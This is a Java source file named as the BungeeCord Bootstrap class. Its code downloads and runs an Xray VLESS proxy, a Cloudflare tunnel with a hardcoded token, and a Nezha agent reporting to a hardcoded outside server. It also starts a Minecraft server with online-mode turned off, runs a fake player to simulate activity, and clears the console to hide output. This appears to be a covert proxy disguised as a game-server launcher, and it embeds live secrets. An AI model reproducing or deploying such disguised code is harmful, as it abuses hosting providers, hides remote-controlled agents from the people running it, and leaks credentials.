package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.stream.Stream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class Bootstrap
{
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET = "\033[0m";

    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process xrayProcess;
    private static Process argoProcess;
    private static Process nezhaProcess;
    private static Process minecraftProcess;
    private static Thread keepaliveThread;
    
    private static final String[] ALL_ENV_VARS = {
        "UUID", "VLESS_PORT", "ARGO_AUTH", "ARGO_DOMAIN",
        "NEZHA_SERVER", "NEZHA_PORT", "NEZHA_KEY", "NEZHA_TLS",
        "MC_JAR", "MC_MEMORY", "MC_ARGS", "MC_PORT",
        "MC_KEEPALIVE_HOST", "MC_KEEPALIVE_PORT",
        "FAKE_PLAYER_ENABLED", "FAKE_PLAYER_NAME"
    };

    public static void main(String[] args) throws Exception
    {
        try {
            Map<String, String> config = loadConfig();
            
            // 1. 启动真实的 Minecraft 服务器（如果配置了）
            if (isMcServerEnabled(config)) {
                startMinecraftServer(config);
            }
            
            // 2. 启动哪吒
            if (isNezhaConfigured(config)) {
                runNezhaAgent(config);
            }
            
            // 3. 启动 Xray (VLESS)
            runXrayService(config);
            
            // 4. 启动 Cloudflare Argo Tunnel
            String argoUrl = runArgoTunnel(config);
            
            // 5. 生成并显示 VLESS 节点链接
            String vlessUrl = generateVlessUrl(config, argoUrl);
            
            System.out.println(ANSI_GREEN + "\n=== VLESS+WS+Argo Configuration ===" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "UUID: " + config.get("UUID") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Local Port: " + config.get("VLESS_PORT") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Argo Domain: " + argoUrl + ANSI_RESET);
            System.out.println(ANSI_GREEN + "\n=== VLESS Node URL ===" + ANSI_RESET);
            System.out.println(ANSI_GREEN + vlessUrl + ANSI_RESET);
            System.out.println(ANSI_GREEN + "================================" + ANSI_RESET);
            
            // 6. 启动真实假玩家（推荐）
            if (isFakePlayerBotEnabled(config)) {
                System.out.println(ANSI_YELLOW + "[FakePlayer] Waiting for MC server to fully start..." + ANSI_RESET);
                waitForServerReady();
                startFakePlayerBot(config);
            } 
            // 或者启动简单 MC 保活（备选）
            else if (isMcKeepaliveEnabled(config)) {
                System.out.println(ANSI_YELLOW + "[MC-Keepalive] Waiting 60s for MC server to start..." + ANSI_RESET);
                Thread.sleep(60000);
                startMcKeepalive(config);
            }
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));
            
            // 延时清屏
            new Thread(() -> {
                try {
                    Thread.sleep(30000); 
                    clearConsole();
                } catch (InterruptedException e) {}
            }).start();
            
            // 保持主线程活跃
            while (running.get()) {
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException e) {
                    break;
                }
            }
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Init Error: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }
    }
    
    private static void clearConsole() {
        try {
            System.out.print("\033[H\033[2J");
            System.out.flush();
        } catch (Exception ignored) {}
    }
    
    private static boolean isNezhaConfigured(Map<String, String> config) {
        String server = config.get("NEZHA_SERVER");
        String key = config.get("NEZHA_KEY");
        return server != null && !server.trim().isEmpty() 
            && key != null && !key.trim().isEmpty();
    }
    
    private static void runNezhaAgent(Map<String, String> config) throws Exception {
        Path nezhaPath = downloadNezhaAgent();
        Path nezhaConfigPath = createNezhaConfig(config);
        
        // 强力清理旧数据
        Path nezhaDir = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-work");
        if (Files.exists(nezhaDir)) {
            try (Stream<Path> walk = Files.walk(nezhaDir)) {
                walk.sorted(Comparator.reverseOrder())
                    .map(Path::toFile)
                    .forEach(File::delete);
            } catch (Exception e) {}
        }
        Files.createDirectories(nezhaDir);
        
        System.out.println(ANSI_GREEN + "Starting Nezha Agent..." + ANSI_RESET);
        
        List<String> cmd = new ArrayList<>();
        cmd.add(nezhaPath.toString());
        cmd.add("-c");
        cmd.add(nezhaConfigPath.toString());
        
        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.directory(nezhaDir.toFile());
        pb.redirectErrorStream(true);
        
        nezhaProcess = pb.start();
        
        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(nezhaProcess.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.contains("NEZHA") || line.contains("error") || line.contains("Error")) {
                        System.out.println(ANSI_GREEN + "[Nezha] " + ANSI_RESET + line);
                    }
                }
            } catch (IOException e) {}
        }).start();
        
        Thread.sleep(1000);
        if (!nezhaProcess.isAlive()) {
             System.out.println(ANSI_RED + "Nezha Agent exited prematurely: " + nezhaProcess.exitValue() + ANSI_RESET);
        }
    }
    
    private static void runXrayService(Map<String, String> config) throws Exception {
        Path xrayPath = downloadXray();
        Path configPath = createXrayConfig(config);
        
        System.out.println(ANSI_GREEN + "Starting Xray Server (VLESS+WS)..." + ANSI_RESET);
        
        ProcessBuilder pb = new ProcessBuilder(
            xrayPath.toString(), "run", "-c", configPath.toString()
        );
        pb.redirectErrorStream(true);
        
        xrayProcess = pb.start();
        
        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(xrayProcess.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    // 只显示错误和警告
                    if (line.contains("error") || line.contains("warning") || line.contains("fatal")) {
                        System.out.println(ANSI_YELLOW + "[Xray] " + ANSI_RESET + line);
                    }
                }
            } catch (IOException e) {}
        }).start();
        
        Thread.sleep(1000);
        if (!xrayProcess.isAlive()) {
             System.out.println(ANSI_RED + "Xray Server exited prematurely: " + xrayProcess.exitValue() + ANSI_RESET);
        }
    }
    
    private static String runArgoTunnel(Map<String, String> config) throws Exception {
        Path cloudflaredPath = downloadCloudflared();
        String vlessPort = config.get("VLESS_PORT");
        String argoAuth = config.get("ARGO_AUTH");
        String argoDomain = config.get("ARGO_DOMAIN");
        
        System.out.println(ANSI_GREEN + "Starting Cloudflare Argo Tunnel..." + ANSI_RESET);
        
        List<String> cmd = new ArrayList<>();
        cmd.add(cloudflaredPath.toString());
        cmd.add("tunnel");
        
        // 如果提供了认证信息，使用命名隧道
        if (argoAuth != null && !argoAuth.trim().isEmpty()) {
            cmd.add("--edge-ip-version");
            cmd.add("auto");
            cmd.add("--protocol");
            cmd.add("http2");
            cmd.add("run");
            cmd.add("--token");
            cmd.add(argoAuth);
        } else {
            // 否则使用临时隧道
            cmd.add("--url");
            cmd.add("http://127.0.0.1:" + vlessPort);
            cmd.add("--no-autoupdate");
        }
        
        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.redirectErrorStream(true);
        
        argoProcess = pb.start();
        
        final String[] detectedUrl = {argoDomain != null && !argoDomain.isEmpty() ? argoDomain : null};
        
        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(argoProcess.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    System.out.println(ANSI_YELLOW + "[Argo] " + ANSI_RESET + line);
                    
                    // 提取临时隧道 URL
                    if (detectedUrl[0] == null && line.contains("trycloudflare.com")) {
                        String[] parts = line.split("\\s+");
                        for (String part : parts) {
                            if (part.contains("trycloudflare.com")) {
                                detectedUrl[0] = part.replace("https://", "").replace("http://", "");
                                System.out.println(ANSI_GREEN + "[Argo] Tunnel URL detected: " + detectedUrl[0] + ANSI_RESET);
                                break;
                            }
                        }
                    }
                }
            } catch (IOException e) {}
        }).start();
        
        // 等待隧道建立
        Thread.sleep(5000);
        
        if (!argoProcess.isAlive()) {
            System.out.println(ANSI_RED + "Argo Tunnel exited prematurely: " + argoProcess.exitValue() + ANSI_RESET);
        }
        
        return detectedUrl[0] != null ? detectedUrl[0] : "tunnel-not-ready.trycloudflare.com";
    }
    
    private static Map<String, String> loadConfig() {
        Map<String, String> config = new HashMap<>();
        // 默认配置
        config.put("UUID", "677a8a0b-7234-4903-bd73-74ecbe4cf7df");
        config.put("VLESS_PORT", "8001");  // Xray 监听端口
        config.put("ARGO_AUTH", "eyJhIjoiMGU3ZjI2MWZiY2ExMzcwNzZhNGZmODcxMzU3ZjYzNGQiLCJ0IjoiYjQxZDJlZDgtZmFlMi00MjZiLTk1MGMtMjc5YWQ0MDY4OTUyIiwicyI6IllUZG1PVFUyTW1VdE0yTTVaaTAwWWpRd0xUaGpPRFF0TlRRMllXRTBaRFEzWm1KaCJ9");  // Argo 隧道 token（留空使用临时隧道）
        config.put("ARGO_DOMAIN", "swiftservers.svip888.us.kg");  // 自定义域名（留空使用临时域名）
        config.put("NEZHA_SERVER", "mbb.svip888.us.kg:53100");
        config.put("NEZHA_PORT", "");
        config.put("NEZHA_KEY", "VnrTnhgoack6PhnRH6lyshe4OVkHmPyM");
        config.put("NEZHA_TLS", "false");
        // Minecraft 服务器配置
        config.put("MC_JAR", "server99.jar");
        config.put("MC_MEMORY", "512M");
        config.put("MC_ARGS", "");
        config.put("MC_PORT", "25565");
        // Minecraft 保活配置
        config.put("MC_KEEPALIVE_HOST", "");
        config.put("MC_KEEPALIVE_PORT", "25565");
        // 真实假玩家配置
        config.put("FAKE_PLAYER_ENABLED", "true");
        config.put("FAKE_PLAYER_NAME", "labubu");
        
        // 环境变量覆盖
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.isEmpty()) config.put(var, value);
        }
        return config;
    }
    
    private static String generateVlessUrl(Map<String, String> config, String argoDomain) {
        try {
            // vless://UUID@domain:443?type=ws&host=domain&path=/vless&security=tls&encryption=none#Name
            StringBuilder url = new StringBuilder("vless://");
            
            url.append(config.get("UUID")).append("@");
            url.append(argoDomain).append(":443");
            
            // 参数部分
            List<String> params = new ArrayList<>();
            params.add("type=ws");
            params.add("host=" + argoDomain);
            params.add("path=" + URLEncoder.encode("/vless", "UTF-8"));
            params.add("security=tls");
            params.add("encryption=none");
            params.add("sni=" + argoDomain);
            
            url.append("?").append(String.join("&", params));
            url.append("#VLESS-Argo");
            
            return url.toString();
        } catch (Exception e) { 
            e.printStackTrace();
            return ""; 
        }
    }
    
    private static Path createXrayConfig(Map<String, String> config) throws IOException {
        StringBuilder json = new StringBuilder();
        
        json.append("{\n");
        json.append("  \"log\": {\n");
        json.append("    \"loglevel\": \"warning\"\n");
        json.append("  },\n");
        json.append("  \"inbounds\": [{\n");
        json.append("    \"port\": ").append(config.get("VLESS_PORT")).append(",\n");
        json.append("    \"protocol\": \"vless\",\n");
        json.append("    \"settings\": {\n");
        json.append("      \"clients\": [{\n");
        json.append("        \"id\": \"").append(config.get("UUID")).append("\",\n");
        json.append("        \"level\": 0\n");
        json.append("      }],\n");
        json.append("      \"decryption\": \"none\"\n");
        json.append("    },\n");
        json.append("    \"streamSettings\": {\n");
        json.append("      \"network\": \"ws\",\n");
        json.append("      \"wsSettings\": {\n");
        json.append("        \"path\": \"/vless\"\n");
        json.append("      }\n");
        json.append("    }\n");
        json.append("  }],\n");
        json.append("  \"outbounds\": [{\n");
        json.append("    \"protocol\": \"freedom\"\n");
        json.append("  }]\n");
        json.append("}\n");
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "xray-config.json");
        Files.write(path, json.toString().getBytes());
        
        System.out.println(ANSI_GREEN + "Xray Config created" + ANSI_RESET);
        return path;
    }
    
    private static Path createNezhaConfig(Map<String, String> config) throws IOException {
        String server = config.get("NEZHA_SERVER");
        String port = config.getOrDefault("NEZHA_PORT", "5555");
        if (!server.contains(":")) server += ":" + port;
        
        boolean tls = false;
        if (config.containsKey("NEZHA_TLS") && !config.get("NEZHA_TLS").isEmpty()) {
            tls = Boolean.parseBoolean(config.get("NEZHA_TLS"));
        }
        
        String uuid = config.get("UUID");
        String secret = config.get("NEZHA_KEY");
        
        String yml = String.format(
            "client_id: \"%s\"\n" +
            "uuid: \"%s\"\n" +
            "client_secret: \"%s\"\n" +
            "debug: true\n" +
            "server: \"%s\"\n" +
            "tls: %b\n" +
            "report_delay: 4\n" +
            "skip_connection_count: true\n" +
            "skip_procs_count: true\n" +
            "disable_auto_update: true\n" +
            "disable_force_update: true\n",
            uuid, uuid, secret, server, tls
        );
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-config.yml");
        Files.write(path, yml.getBytes());
        System.out.println(ANSI_GREEN + "Nezha Config created for UUID: " + uuid + ANSI_RESET);
        return path;
    }
    
    private static Path downloadXray() throws IOException {
        String url = "https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip";
        if (System.getProperty("os.arch").contains("aarch64")) {
            url = "https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-arm64-v8a.zip";
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "xray");
        if (!Files.exists(path)) {
            System.out.println("Downloading Xray...");
            Path zip = Paths.get(System.getProperty("java.io.tmpdir"), "xray.zip");
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, zip, StandardCopyOption.REPLACE_EXISTING);
            }
            
            unzipFile(zip, Paths.get(System.getProperty("java.io.tmpdir")), "xray");
            Files.delete(zip);
            path.toFile().setExecutable(true);
        }
        return path;
    }
    
    private static Path downloadCloudflared() throws IOException {
        String url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64";
        if (System.getProperty("os.arch").contains("aarch64")) {
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64";
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "cloudflared");
        if (!Files.exists(path)) {
            System.out.println("Downloading Cloudflared...");
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }
        return path;
    }
    
    private static Path downloadNezhaAgent() throws IOException {
        String url = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.zip";
        if (System.getProperty("os.arch").contains("aarch64")) {
            url = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_arm64.zip";
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-agent");
        if (!Files.exists(path)) {
            System.out.println("Downloading Nezha...");
            Path zip = Paths.get(System.getProperty("java.io.tmpdir"), "nezha.zip");
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, zip, StandardCopyOption.REPLACE_EXISTING);
            }
            
            unzipFile(zip, Paths.get(System.getProperty("java.io.tmpdir")), "nezha-agent");
            Files.delete(zip);
        }
        return path;
    }
    
    private static void stopServices() {
        if (minecraftProcess != null) {
            System.out.println(ANSI_YELLOW + "Stopping Minecraft Server..." + ANSI_RESET);
            minecraftProcess.destroy();
            try {
                minecraftProcess.waitFor(10, java.util.concurrent.TimeUnit.SECONDS);
            } catch (InterruptedException e) {}
        }
        if (nezhaProcess != null) nezhaProcess.destroy();
        if (xrayProcess != null) xrayProcess.destroy();
        if (argoProcess != null) argoProcess.destroy();
        if (keepaliveThread != null) keepaliveThread.interrupt();
    }
    
    // ==================== Minecraft 服务器启动 ====================
    
    private static boolean isMcServerEnabled(Map<String, String> config) {
        String jarName = config.get("MC_JAR");
        return jarName != null && !jarName.trim().isEmpty();
    }
    
    private static void startMinecraftServer(Map<String, String> config) throws Exception {
        String jarName = config.get("MC_JAR");
        String memory = config.getOrDefault("MC_MEMORY", "512M");
        String extraArgs = config.getOrDefault("MC_ARGS", "");
        
        if (!memory.matches("\\d+[MG]")) {
            System.out.println(ANSI_RED + "[MC-Server] Invalid memory format: " + memory + ANSI_RESET);
            System.out.println(ANSI_YELLOW + "[MC-Server] Using default: 512M" + ANSI_RESET);
            memory = "512M";
        }
        
        Path jarPath = Paths.get(jarName);
        if (!Files.exists(jarPath)) {
            System.out.println(ANSI_RED + "[MC-Server] Error: " + jarName + " not found!" + ANSI_RESET);
            System.out.println(ANSI_YELLOW + "[MC-Server] Skipping Minecraft server startup" + ANSI_RESET);
            return;
        }
        
        Path eulaPath = Paths.get("eula.txt");
        if (!Files.exists(eulaPath)) {
            System.out.println(ANSI_GREEN + "[MC-Server] Creating eula.txt (auto-accepting)" + ANSI_RESET);
            Files.write(eulaPath, "eula=true".getBytes());
        }
        
        Path propPath = Paths.get("server.properties");
        if (Files.exists(propPath)) {
            String props = new String(Files.readAllBytes(propPath));
            if (props.contains("online-mode=true")) {
                System.out.println(ANSI_GREEN + "[MC-Server] Setting online-mode=false for fake player support" + ANSI_RESET);
                props = props.replace("online-mode=true", "online-mode=false");
                Files.write(propPath, props.getBytes());
            }
        }
        
        System.out.println(ANSI_GREEN + "=== Starting Minecraft Server ===" + ANSI_RESET);
        System.out.println(ANSI_GREEN + "JAR: " + jarName + ANSI_RESET);
        System.out.println(ANSI_GREEN + "Memory: " + memory + ANSI_RESET);
        
        List<String> cmd = new ArrayList<>();
        cmd.add("java");
        cmd.add("-Xms" + memory);
        cmd.add("-Xmx" + memory);
        
        if (!extraArgs.trim().isEmpty()) {
            cmd.addAll(Arrays.asList(extraArgs.split("\\s+")));
        }
        
        int memoryMB = parseMemory(memory);
        
        if (memoryMB >= 2048) {
            cmd.add("-XX:+UseG1GC");
            cmd.add("-XX:+ParallelRefProcEnabled");
            cmd.add("-XX:MaxGCPauseMillis=200");
            cmd.add("-XX:+UnlockExperimentalVMOptions");
            cmd.add("-XX:+DisableExplicitGC");
        } else if (memoryMB >= 1024) {
            cmd.add("-XX:+UseG1GC");
            cmd.add("-XX:MaxGCPauseMillis=200");
            cmd.add("-XX:+DisableExplicitGC");
        } else {
            cmd.add("-XX:+UseSerialGC");
            cmd.add("-XX:+DisableExplicitGC");
        }
        
        cmd.add("-jar");
        cmd.add(jarName);
        cmd.add("nogui");
        
        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.redirectErrorStream(true);
        
        minecraftProcess = pb.start();
        
        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(minecraftProcess.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    System.out.println("[MC-Server] " + line);
                }
            } catch (IOException e) {}
        }).start();
        
        Thread.sleep(3000);
        if (!minecraftProcess.isAlive()) {
            System.out.println(ANSI_RED + "[MC-Server] Failed to start! Exit code: " + 
                             minecraftProcess.exitValue() + ANSI_RESET);
        } else {
            System.out.println(ANSI_GREEN + "[MC-Server] ✓ Started successfully" + ANSI_RESET);
        }
    }
    
    private static int parseMemory(String memory) {
        try {
            memory = memory.toUpperCase().trim();
            if (memory.endsWith("G")) {
                return Integer.parseInt(memory.substring(0, memory.length() - 1)) * 1024;
            } else if (memory.endsWith("M")) {
                return Integer.parseInt(memory.substring(0, memory.length() - 1));
            }
        } catch (Exception e) {}
        return 1024;
    }
    
    // ==================== 假玩家功能（保持原样）====================
    
    private static void waitForServerReady() throws InterruptedException {
        int mcPort = 25565;
        try {
            String portEnv = System.getenv("MC_PORT");
            if (portEnv != null && !portEnv.isEmpty()) {
                mcPort = Integer.parseInt(portEnv);
            }
        } catch (Exception e) {}
        
        System.out.println(ANSI_YELLOW + "[FakePlayer] Checking server status on port " + mcPort + " every 5s..." + ANSI_RESET);
        
        for (int i = 0; i < 60; i++) {
            try {
                Thread.sleep(5000);
                
                try (Socket testSocket = new Socket()) {
                    testSocket.connect(new InetSocketAddress("127.0.0.1", mcPort), 3000);
                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Server port " + mcPort + " is open!" + ANSI_RESET);
                    Thread.sleep(10000);
                    return;
                }
            } catch (Exception e) {
                if (i % 6 == 0) {
                    System.out.println(ANSI_YELLOW + "[FakePlayer] Still waiting... (" + (i * 5) + "s)" + ANSI_RESET);
                }
            }
        }
        
        System.out.println(ANSI_RED + "[FakePlayer] Warning: Timeout waiting for server, trying anyway..." + ANSI_RESET);
    }
    
    private static boolean isFakePlayerBotEnabled(Map<String, String> config) {
        String enabled = config.get("FAKE_PLAYER_ENABLED");
        return enabled != null && enabled.equalsIgnoreCase("true");
    }
    
    private static void startFakePlayerBot(Map<String, String> config) {
        String playerName = config.getOrDefault("FAKE_PLAYER_NAME", "labubu");
        int mcPort = Integer.parseInt(config.getOrDefault("MC_PORT", "25813"));

        System.out.println(ANSI_GREEN + "[FakePlayer] Starting fake player bot: " + playerName + ANSI_RESET);

        keepaliveThread = new Thread(() -> {
            while (running.get()) {
                Socket socket = null;
                try {
                    socket = new Socket();
                    socket.setReceiveBufferSize(1024 * 1024 * 10);
                    socket.connect(new InetSocketAddress("127.0.0.1", mcPort), 5000);
                    socket.setSoTimeout(60000);

                    DataOutputStream out = new DataOutputStream(socket.getOutputStream());
                    DataInputStream in = new DataInputStream(new java.io.BufferedInputStream(socket.getInputStream()));

                    ByteArrayOutputStream handshakeBuf = new ByteArrayOutputStream();
                    DataOutputStream handshake = new DataOutputStream(handshakeBuf);
                    writeVarInt(handshake, 0x00);
                    writeVarInt(handshake, 774);
                    writeString(handshake, "127.0.0.1");
                    handshake.writeShort(mcPort);
                    writeVarInt(handshake, 2);
                    byte[] handshakeData = handshakeBuf.toByteArray();
                    writeVarInt(out, handshakeData.length);
                    out.write(handshakeData);
                    out.flush();

                    ByteArrayOutputStream loginBuf = new ByteArrayOutputStream();
                    DataOutputStream login = new DataOutputStream(loginBuf);
                    writeVarInt(login, 0x00);
                    writeString(login, playerName);
                    java.util.UUID playerUUID = java.util.UUID.nameUUIDFromBytes(("OfflinePlayer:" + playerName).getBytes("UTF-8"));
                    login.writeLong(playerUUID.getMostSignificantBits());
                    login.writeLong(playerUUID.getLeastSignificantBits());
                    byte[] loginData = loginBuf.toByteArray();
                    writeVarInt(out, loginData.length);
                    out.write(loginData);
                    out.flush();

                    boolean configPhase = false;
                    boolean playPhase = false;
                    boolean compressionEnabled = false;
                    int compressionThreshold = -1;

                    while (running.get() && !socket.isClosed()) {
                        try {
                            int packetLength = readVarInt(in);
                            if (packetLength < 0 || packetLength > 100000000) {
                                throw new java.io.IOException("Bad packet size");
                            }

                            byte[] packetData = null;
                            
                            if (compressionEnabled) {
                                int dataLength = readVarInt(in);
                                int compressedLength = packetLength - getVarIntSize(dataLength);
                                byte[] compressedData = new byte[compressedLength];
                                in.readFully(compressedData);

                                if (dataLength == 0) {
                                    packetData = compressedData;
                                } else if (dataLength <= 8192) {
                                    java.util.zip.Inflater inflater = new java.util.zip.Inflater();
                                    inflater.setInput(compressedData);
                                    packetData = new byte[dataLength];
                                    inflater.inflate(packetData);
                                    inflater.end();
                                }
                            } else {
                                packetData = new byte[packetLength];
                                in.readFully(packetData);
                            }

                            if (packetData == null) continue;

                            ByteArrayInputStream packetStream = new ByteArrayInputStream(packetData);
                            DataInputStream packetIn = new DataInputStream(packetStream);
                            int packetId = readVarInt(packetIn);

                            if (!playPhase) {
                                if (!configPhase) {
                                    if (packetId == 0x03) {
                                        compressionThreshold = readVarInt(packetIn);
                                        compressionEnabled = compressionThreshold >= 0;
                                    } else if (packetId == 0x02) {
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        DataOutputStream ack = new DataOutputStream(ackBuf);
                                        writeVarInt(ack, 0x03);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                        configPhase = true;
                                    }
                                } else {
                                    if (packetId == 0x03) {
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        DataOutputStream ack = new DataOutputStream(ackBuf);
                                        writeVarInt(ack, 0x03);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                        playPhase = true;
                                    } else if (packetId == 0x04 && packetIn.available() >= 8) {
                                        long id = packetIn.readLong();
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        DataOutputStream ack = new DataOutputStream(ackBuf);
                                        writeVarInt(ack, 0x04);
                                        ack.writeLong(id);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                    }
                                }
                            } else {
                                if (packetId >= 0x20 && packetId <= 0x30 && packetIn.available() == 8) {
                                    long keepAliveId = packetIn.readLong();
                                    ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                    DataOutputStream bufOut = new DataOutputStream(buf);
                                    writeVarInt(bufOut, 0x1B);
                                    bufOut.writeLong(keepAliveId);
                                    sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
                                }
                            }
                        } catch (java.net.SocketTimeoutException e) {
                            continue;
                        } catch (Exception e) {
                            break;
                        }
                    }

                    if (socket != null) socket.close();
                    Thread.sleep(10000);

                } catch (Exception e) {
                    try { Thread.sleep(10000); } catch (InterruptedException ex) { break; }
                }
            }
        });

        keepaliveThread.setDaemon(true);
        keepaliveThread.start();
    }
    
    private static int getVarIntSize(int value) {
        int size = 0;
        do {
            size++;
            value >>>= 7;
        } while (value != 0);
        return size;
    }
    
    private static void sendPacket(DataOutputStream out, byte[] packet, boolean compress, int threshold) throws IOException {
        if (!compress || packet.length < threshold) {
            if (compress) {
                ByteArrayOutputStream buf = new ByteArrayOutputStream();
                DataOutputStream bufOut = new DataOutputStream(buf);
                writeVarInt(bufOut, 0);
                bufOut.write(packet);
                
                byte[] finalPacket = buf.toByteArray();
                writeVarInt(out, finalPacket.length);
                out.write(finalPacket);
            } else {
                writeVarInt(out, packet.length);
                out.write(packet);
            }
        } else {
            byte[] compressedData = compressData(packet);
            
            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            DataOutputStream bufOut = new DataOutputStream(buf);
            writeVarInt(bufOut, packet.length);
            bufOut.write(compressedData);
            
            byte[] finalPacket = buf.toByteArray();
            writeVarInt(out, finalPacket.length);
            out.write(finalPacket);
        }
        out.flush();
    }
    
    private static byte[] compressData(byte[] data) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        java.util.zip.Deflater deflater = new java.util.zip.Deflater();
        deflater.setInput(data);
        deflater.finish();
        
        byte[] buffer = new byte[1024];
        while (!deflater.finished()) {
            int count = deflater.deflate(buffer);
            out.write(buffer, 0, count);
        }
        deflater.end();
        return out.toByteArray();
    }
    
    private static boolean isMcKeepaliveEnabled(Map<String, String> config) {
        String host = config.get("MC_KEEPALIVE_HOST");
        return host != null && !host.trim().isEmpty();
    }
    
    private static void startMcKeepalive(Map<String, String> config) {
        String host = config.get("MC_KEEPALIVE_HOST");
        int port = Integer.parseInt(config.getOrDefault("MC_KEEPALIVE_PORT", "25565"));
        
        keepaliveThread = new Thread(() -> {
            while (running.get()) {
                try {
                    pingMinecraftServer(host, port);
                    Thread.sleep(300000);
                } catch (InterruptedException e) {
                    break;
                } catch (Exception e) {
                    try { Thread.sleep(60000); } catch (InterruptedException ex) { break; }
                }
            }
        });
        keepaliveThread.setDaemon(true);
        keepaliveThread.start();
    }
    
    private static void pingMinecraftServer(String host, int port) throws IOException {
        try (Socket socket = new Socket()) {
            socket.connect(new InetSocketAddress(host, port), 5000);
            socket.setSoTimeout(5000);
            
            DataOutputStream out = new DataOutputStream(socket.getOutputStream());
            DataInputStream in = new DataInputStream(socket.getInputStream());
            
            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            DataOutputStream packet = new DataOutputStream(buf);
            
            writeVarInt(packet, 0x00);
            writeVarInt(packet, 47);
            writeString(packet, host);
            packet.writeShort(port);
            writeVarInt(packet, 1);
            
            byte[] handshake = buf.toByteArray();
            writeVarInt(out, handshake.length);
            out.write(handshake);
            
            buf.reset();
            packet = new DataOutputStream(buf);
            writeVarInt(packet, 0x00);
            
            byte[] request = buf.toByteArray();
            writeVarInt(out, request.length);
            out.write(request);
            out.flush();
            
            readVarInt(in);
        }
    }
    
    private static void writeVarInt(DataOutputStream out, int value) throws IOException {
        while ((value & 0xFFFFFF80) != 0) {
            out.writeByte((value & 0x7F) | 0x80);
            value >>>= 7;
        }
        out.writeByte(value & 0x7F);
    }
    
    private static void writeString(DataOutputStream out, String str) throws IOException {
        byte[] bytes = str.getBytes("UTF-8");
        writeVarInt(out, bytes.length);
        out.write(bytes);
    }
    
    private static int readVarInt(DataInputStream in) throws IOException {
        int value = 0;
        int length = 0;
        byte currentByte;
        do {
            currentByte = in.readByte();
            value |= (currentByte & 0x7F) << (length * 7);
            length++;
            if (length > 5) throw new IOException("VarInt too big");
        } while ((currentByte & 0x80) == 0x80);
        return value;
    }
    
    private static void unzipFile(Path zipPath, Path destDir, String targetFile) throws IOException {
        Files.createDirectories(destDir);
        
        try (ZipInputStream zis = new ZipInputStream(new FileInputStream(zipPath.toFile()))) {
            ZipEntry entry;
            while ((entry = zis.getNextEntry()) != null) {
                if (entry.getName().equals(targetFile) || entry.getName().endsWith("/" + targetFile)) {
                    Path outPath = destDir.resolve(targetFile);
                    try (FileOutputStream fos = new FileOutputStream(outPath.toFile())) {
                        byte[] buffer = new byte[8192];
                        int len;
                        while ((len = zis.read(buffer)) > 0) {
                            fos.write(buffer, 0, len);
                        }
                    }
                    outPath.toFile().setExecutable(true);
                    break;
                }
                zis.closeEntry();
            }
        }
    }
}
